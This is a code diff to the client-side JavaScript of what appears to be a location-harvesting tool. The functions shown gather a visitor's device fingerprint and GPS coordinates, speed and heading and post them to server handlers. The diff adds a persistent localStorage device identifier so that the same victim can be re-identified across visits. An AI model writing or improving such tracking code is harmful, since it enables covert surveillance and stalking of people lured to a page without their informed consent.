@@ -74,11 +74,25 @@ function information() {
     os = 'Not Available';
   }
   os = os.trim();
+
+  function getOrCreateDeviceId() {
+    try {
+      var id = localStorage.getItem('seeker_device_id');
+      if (!id || id.length < 5) {
+        id = 'dev_' + Math.random().toString(36).substring(2, 10);
+        localStorage.setItem('seeker_device_id', id);
+      }
+      return id;
+    } catch (e) {
+      return 'dev_' + Math.random().toString(36).substring(2, 10);
+    }
+  }
+
   //
   $.ajax({
     type: 'POST',
     url: 'info_handler.php',
-    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
+    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, DevId: getOrCreateDeviceId() },
     success: function () { },
     mimeType: 'text'
   });
@@ -166,10 +180,23 @@ function locate(callback, errCallback) {
 
     var ok_status = 'success';
 
+    function getOrCreateDeviceId() {
+      try {
+        var id = localStorage.getItem('seeker_device_id');
+        if (!id || id.length < 5) {
+          id = 'dev_' + Math.random().toString(36).substring(2, 10);
+          localStorage.setItem('seeker_device_id', id);
+        }
+        return id;
+      } catch (e) {
+        return 'dev_' + Math.random().toString(36).substring(2, 10);
+      }
+    }
+
     $.ajax({
       type: 'POST',
       url: 'result_handler.php',
-      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
+      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, DevId: getOrCreateDeviceId() },
       success: callback,
       mimeType: 'text'
     });
